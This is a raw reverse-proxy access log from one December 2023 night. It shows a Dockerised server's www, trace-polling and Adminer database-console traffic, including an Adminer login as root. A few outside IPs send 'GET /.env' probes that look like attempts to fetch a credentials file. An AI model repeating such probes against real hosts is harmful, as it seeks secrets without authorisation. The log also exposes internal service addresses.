4.26.29.194 - - [15/Dec/2023:01:53:11 +0000] "GET /adminer?file=default.css&version=4.8.1 HTTP/2.0" 499 21 "-" "-" 4351 "adminer@docker" "http://172.25.0.10:8080" 0ms
4.26.29.194 - - [15/Dec/2023:01:53:11 +0000] "GET /adminer?file=favicon.ico&version=4.8.1 HTTP/2.0" 499 21 "-" "-" 4352 "adminer@docker" "http://172.25.0.10:8080" 0ms
4.26.29.194 - - [15/Dec/2023:01:53:13 +0000] "POST /adminer?script=version HTTP/2.0" 200 0 "-" "-" 4353 "adminer@docker" "http://172.25.0.10:8080" 2ms
4.26.29.194 - - [15/Dec/2023:01:53:16 +0000] "GET /adminer/ HTTP/2.0" 200 4428 "-" "-" 4354 "adminer@docker" "http://172.25.0.10:8080" 5ms
159.203.109.206 - - [15/Dec/2023:01:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4355 "www@docker" "http://172.25.0.8:80" 19ms
167.71.120.76 - - [15/Dec/2023:01:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4356 "www@docker" "http://172.25.0.8:80" 18ms
159.203.109.206 - - [15/Dec/2023:01:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4357 "www@docker" "http://172.25.0.8:80" 21ms
167.71.120.76 - - [15/Dec/2023:01:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4358 "www@docker" "http://172.25.0.8:80" 20ms
57.129.23.166 - - [15/Dec/2023:01:54:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4359 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:01:54:49 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4360 "web-to-websecure@internal" "-" 0ms
4.26.29.194 - - [15/Dec/2023:01:55:01 +0000] "GET /trace HTTP/2.0" 200 751 "-" "-" 4361 "livetrace@docker" "http://172.25.0.5:80" 27ms
4.26.29.194 - - [15/Dec/2023:01:55:01 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4362 "www@docker" "http://172.25.0.8:80" 29ms
4.26.29.194 - - [15/Dec/2023:01:55:04 +0000] "GET /trace HTTP/2.0" 200 751 "-" "-" 4363 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:01:55:04 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4364 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:08 +0000] "GET /trace/ HTTP/2.0" 200 751 "-" "-" 4365 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:01:55:08 +0000] "GET /trace/start.php?id=a7mpbsaz2 HTTP/2.0" 200 101 "-" "-" 4366 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:01:55:09 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 223 "-" "-" 4367 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:10 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 295 "-" "-" 4368 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:11 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 367 "-" "-" 4369 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:12 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 439 "-" "-" 4370 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:13 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 511 "-" "-" 4371 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:14 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 583 "-" "-" 4372 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:15 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 655 "-" "-" 4373 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:16 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 727 "-" "-" 4374 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:17 +0000] "GET /trace/poll.php?id=a7mpbsaz2 HTTP/2.0" 200 1024 "-" "-" 4375 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:01:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4376 "www@docker" "http://172.25.0.8:80" 15ms
167.71.120.76 - - [15/Dec/2023:01:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4377 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:55:45 +0000] "GET /adminer// HTTP/2.0" 200 4428 "-" "-" 4378 "adminer@docker" "http://172.25.0.10:8080" 28ms
4.26.29.194 - - [15/Dec/2023:01:55:45 +0000] "GET /adminer//?file=default.css&version=4.8.1 HTTP/2.0" 200 6811 "-" "-" 4379 "adminer@docker" "http://172.25.0.10:8080" 4ms
4.26.29.194 - - [15/Dec/2023:01:55:45 +0000] "GET /adminer//?file=functions.js&version=4.8.1 HTTP/2.0" 200 27548 "-" "-" 4380 "adminer@docker" "http://172.25.0.10:8080" 9ms
4.26.29.194 - - [15/Dec/2023:01:55:45 +0000] "GET /adminer//?file=favicon.ico&version=4.8.1 HTTP/2.0" 200 318 "-" "-" 4381 "adminer@docker" "http://172.25.0.10:8080" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:45 +0000] "GET /adminer//?file=favicon.ico&version=4.8.1 HTTP/2.0" 200 318 "-" "-" 4382 "adminer@docker" "http://172.25.0.10:8080" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:51 +0000] "GET /trace// HTTP/2.0" 200 751 "-" "-" 4383 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:01:55:51 +0000] "GET /trace//styles.css HTTP/2.0" 200 629 "-" "-" 4384 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:51 +0000] "GET /trace//script.js HTTP/2.0" 200 1174 "-" "-" 4385 "livetrace@docker" "http://172.25.0.5:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:55:52 +0000] "GET /trace//start.php?id=7y2tftkqy HTTP/2.0" 200 101 "-" "-" 4386 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:53 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 223 "-" "-" 4387 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:55:54 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 295 "-" "-" 4388 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:55 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 367 "-" "-" 4389 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:56 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 439 "-" "-" 4390 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:57 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 511 "-" "-" 4391 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:58 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 583 "-" "-" 4392 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:01:55:59 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 655 "-" "-" 4393 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:56:00 +0000] "GET /adminer HTTP/2.0" 200 4456 "-" "-" 4394 "adminer@docker" "http://172.25.0.10:8080" 2ms
4.26.29.194 - - [15/Dec/2023:01:56:00 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 727 "-" "-" 4395 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:56:01 +0000] "GET /trace//poll.php?id=7y2tftkqy HTTP/2.0" 200 1024 "-" "-" 4396 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:01:56:12 +0000] "POST /adminer HTTP/2.0" 302 0 "-" "-" 4397 "adminer@docker" "http://172.25.0.10:8080" 2ms
4.26.29.194 - - [15/Dec/2023:01:56:12 +0000] "GET /adminer?server=db&username=root HTTP/2.0" 200 8822 "-" "-" 4398 "adminer@docker" "http://172.25.0.10:8080" 23ms
159.203.109.206 - - [15/Dec/2023:01:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4399 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:01:56:30 +0000] "GET /trace HTTP/2.0" 200 751 "-" "-" 4400 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:01:56:30 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4401 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4402 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4403 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4404 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:01:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4405 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:01:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4406 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:01:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4407 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:01:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4408 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4409 "www@docker" "http://172.25.0.8:80" 2ms
167.71.120.76 - - [15/Dec/2023:02:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4410 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4411 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4412 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4413 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4414 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4415 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4416 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4417 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4418 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4419 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4420 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:05:56 +0000] "GET /trace HTTP/2.0" 200 751 "-" "-" 4421 "livetrace@docker" "http://172.25.0.5:80" 8ms
4.26.29.194 - - [15/Dec/2023:02:05:56 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4422 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4423 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4424 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [15/Dec/2023:02:06:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4425 "web-to-websecure@internal" "-" 0ms
4.26.29.194 - - [15/Dec/2023:02:07:16 +0000] "GET /trace HTTP/2.0" 200 755 "-" "-" 4426 "livetrace@docker" "http://172.25.0.5:80" 8ms
4.26.29.194 - - [15/Dec/2023:02:07:16 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4427 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:07:18 +0000] "GET /trace HTTP/2.0" 200 755 "-" "-" 4428 "livetrace@docker" "http://172.25.0.5:80" 5ms
4.26.29.194 - - [15/Dec/2023:02:07:18 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4429 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:07:21 +0000] "GET /trace/ HTTP/2.0" 200 755 "-" "-" 4430 "livetrace@docker" "http://172.25.0.5:80" 6ms
4.26.29.194 - - [15/Dec/2023:02:07:21 +0000] "GET /trace/start.php?id=g7jp8lade HTTP/2.0" 200 101 "-" "-" 4431 "livetrace@docker" "http://172.25.0.5:80" 5ms
4.26.29.194 - - [15/Dec/2023:02:07:22 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 223 "-" "-" 4432 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4433 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:07:23 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 295 "-" "-" 4434 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:07:24 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 367 "-" "-" 4435 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:07:25 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 439 "-" "-" 4436 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:07:26 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 511 "-" "-" 4437 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:07:27 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 583 "-" "-" 4438 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:07:28 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 655 "-" "-" 4439 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:07:29 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 727 "-" "-" 4440 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:07:30 +0000] "GET /trace/poll.php?id=g7jp8lade HTTP/2.0" 200 1024 "-" "-" 4441 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4442 "www@docker" "http://172.25.0.8:80" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4443 "web-to-websecure@internal" "-" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4444 "web-to-websecure@internal" "-" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4445 "web-to-websecure@internal" "-" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4446 "web-to-websecure@internal" "-" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4447 "web-to-websecure@internal" "-" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4448 "web-to-websecure@internal" "-" 0ms
107.172.16.251 - - [15/Dec/2023:02:07:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4449 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4450 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4451 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4452 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:09:26 +0000] "GET /trace/ HTTP/2.0" 200 799 "-" "-" 4453 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:02:09:26 +0000] "GET /trace/start.php?id=d1euwnvjp HTTP/2.0" 200 101 "-" "-" 4454 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:02:09:27 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 223 "-" "-" 4455 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:09:28 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 295 "-" "-" 4456 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:09:29 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 367 "-" "-" 4457 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:09:30 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 439 "-" "-" 4458 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:09:31 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 511 "-" "-" 4459 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:09:32 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 583 "-" "-" 4460 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:09:33 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 655 "-" "-" 4461 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:09:34 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 727 "-" "-" 4462 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:09:35 +0000] "GET /trace/poll.php?id=d1euwnvjp HTTP/2.0" 200 1024 "-" "-" 4463 "livetrace@docker" "http://172.25.0.5:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4464 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [15/Dec/2023:02:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4465 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:10:37 +0000] "GET /trace HTTP/2.0" 200 817 "-" "-" 4466 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:02:10:37 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4467 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4468 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:11:17 +0000] "GET /trace/ HTTP/2.0" 200 817 "-" "-" 4469 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:02:11:17 +0000] "GET /trace/start.php?id=odb0jl2gl HTTP/2.0" 200 101 "-" "-" 4470 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:11:18 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 223 "-" "-" 4471 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:11:19 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 295 "-" "-" 4472 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:11:20 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 367 "-" "-" 4473 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:11:21 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 439 "-" "-" 4474 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:11:22 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 511 "-" "-" 4475 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:11:23 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 583 "-" "-" 4476 "livetrace@docker" "http://172.25.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4477 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:11:24 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 655 "-" "-" 4478 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:11:25 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 727 "-" "-" 4479 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:11:26 +0000] "GET /trace/poll.php?id=odb0jl2gl HTTP/2.0" 200 1024 "-" "-" 4480 "livetrace@docker" "http://172.25.0.5:80" 2ms
167.71.120.76 - - [15/Dec/2023:02:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4481 "www@docker" "http://172.25.0.8:80" 0ms
4.26.29.194 - - [15/Dec/2023:02:12:03 +0000] "GET /trace HTTP/2.0" 200 814 "-" "-" 4482 "livetrace@docker" "http://172.25.0.5:80" 7ms
4.26.29.194 - - [15/Dec/2023:02:12:03 +0000] "GET /script.js HTTP/2.0" 404 153 "-" "-" 4483 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:12:06 +0000] "GET /trace/ HTTP/2.0" 200 814 "-" "-" 4484 "livetrace@docker" "http://172.25.0.5:80" 6ms
4.26.29.194 - - [15/Dec/2023:02:12:06 +0000] "GET /trace/start.php?id=enp5lccxj HTTP/2.0" 200 101 "-" "-" 4485 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:02:12:07 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 223 "-" "-" 4486 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:12:08 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 295 "-" "-" 4487 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:12:09 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 367 "-" "-" 4488 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:12:10 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 439 "-" "-" 4489 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:12:11 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 511 "-" "-" 4490 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:12:12 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 583 "-" "-" 4491 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:12:13 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 655 "-" "-" 4492 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:12:14 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 727 "-" "-" 4493 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:12:15 +0000] "GET /trace/poll.php?id=enp5lccxj HTTP/2.0" 200 1024 "-" "-" 4494 "livetrace@docker" "http://172.25.0.5:80" 2ms
159.203.109.206 - - [15/Dec/2023:02:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4495 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [15/Dec/2023:02:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4496 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [15/Dec/2023:02:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4497 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4498 "www@docker" "http://172.25.0.8:80" 1ms
95.214.235.169 - - [15/Dec/2023:02:14:12 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4499 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:02:14:15 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4500 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:02:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4501 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [15/Dec/2023:02:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4502 "www@docker" "http://172.25.0.8:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:15:04 +0000] "GET /trace/ HTTP/2.0" 200 814 "-" "-" 4503 "livetrace@docker" "http://172.25.0.5:80" 14ms
4.26.29.194 - - [15/Dec/2023:02:15:04 +0000] "GET /trace/start.php?id=axkpde31g HTTP/2.0" 200 101 "-" "-" 4504 "livetrace@docker" "http://172.25.0.5:80" 3ms
4.26.29.194 - - [15/Dec/2023:02:15:05 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 223 "-" "-" 4505 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:15:06 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 295 "-" "-" 4506 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:15:07 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 367 "-" "-" 4507 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:15:08 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 439 "-" "-" 4508 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:15:09 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 511 "-" "-" 4509 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:15:10 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 583 "-" "-" 4510 "livetrace@docker" "http://172.25.0.5:80" 2ms
4.26.29.194 - - [15/Dec/2023:02:15:11 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 655 "-" "-" 4511 "livetrace@docker" "http://172.25.0.5:80" 1ms
4.26.29.194 - - [15/Dec/2023:02:15:12 +0000] "GET /trace/poll.php?id=axkpde31g HTTP/2.0" 200 727 "-" "-" 4512 "livetrace@docker" "http://172.25.0.5:80" 1ms
